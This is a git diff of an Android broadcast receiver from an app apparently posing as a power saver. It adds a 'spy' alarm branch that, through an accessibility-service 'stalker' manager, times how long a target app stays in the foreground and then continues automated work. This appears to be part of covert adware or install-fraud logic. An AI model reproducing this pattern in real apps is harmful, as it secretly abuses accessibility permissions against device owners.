@@ -7,11 +7,15 @@ import android.net.ConnectivityManager;
 import android.text.TextUtils;
 
 import com.luna.powersaver.gp.async.NetAsyncTask;
+import com.luna.powersaver.gp.common.StaticConst;
+import com.luna.powersaver.gp.entity.JsonAppInfo;
 import com.luna.powersaver.gp.http.DownloadManager;
 import com.luna.powersaver.gp.manager.ClockManager;
+import com.luna.powersaver.gp.manager.StalkerManager;
 import com.luna.powersaver.gp.service.GuardService;
 import com.luna.powersaver.gp.service.NBAccessibilityService;
 import com.luna.powersaver.gp.utils.AppDebugLog;
+import com.luna.powersaver.gp.utils.AppUtil;
 import com.luna.powersaver.gp.utils.NetworkUtil;
 
 import static com.luna.powersaver.gp.manager.ClockManager.ACTION_CLOCK;
@@ -22,7 +26,7 @@ import static com.luna.powersaver.gp.manager.ClockManager.ACTION_CLOCK;
  * @date 2017/1/12
  */
 
-public class BootReceiver extends BroadcastReceiver{
+public class CReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         if (context == null || intent == null || TextUtils.isEmpty(intent.getAction()))
@@ -36,17 +40,28 @@ public class BootReceiver extends BroadcastReceiver{
         } else if (ConnectivityManager.CONNECTIVITY_ACTION.equals(action)) {
 
             // 接收到网络连接状态变化的广播
-            if (NBAccessibilityService.sIsInWork) {
-                if (NetworkUtil.isWifiConnected(context)) {
+            if (NetworkUtil.isWifiConnected(context)) {
+                if (NBAccessibilityService.sIsInWork) {
                     DownloadManager.getInstance(context).startDownload();
-                } else {
-                    DownloadManager.getInstance(context).stopAllDownload();
                 }
+            } else {
+                DownloadManager.getInstance(context).stopAllDownload();
             }
         } else if (ClockManager.ACTION_CLOCK.equals(action)) {
             AppDebugLog.d(AppDebugLog.TAG_NET, "接收到轮询的广播请求! + " + ACTION_CLOCK);
             ClockManager.get().startAlarm(context);
             new NetAsyncTask().execute();
+        } else if (ClockManager.ACTION_OPEN_SPY.equals(action)) {
+            if (NBAccessibilityService.sIsInWork) {
+                JsonAppInfo info = StalkerManager.get().pCurrentWorkInfo;
+                if (info != null && AppUtil.isPkgForeground(StaticConst.sContext, info.pkg)) {
+                    info.opentime += (System.currentTimeMillis() - ClockManager.get().getLastOpenSpyTime()) / 1000;
+                    if (StalkerManager.get().isFinishedOpen()) {
+//                        AppInfoUtil.jumpToHome(StaticConst.sContext);
+                        StalkerManager.get().doContinueAfterOpened();
+                    }
+                }
+            }
         }
     }
 }
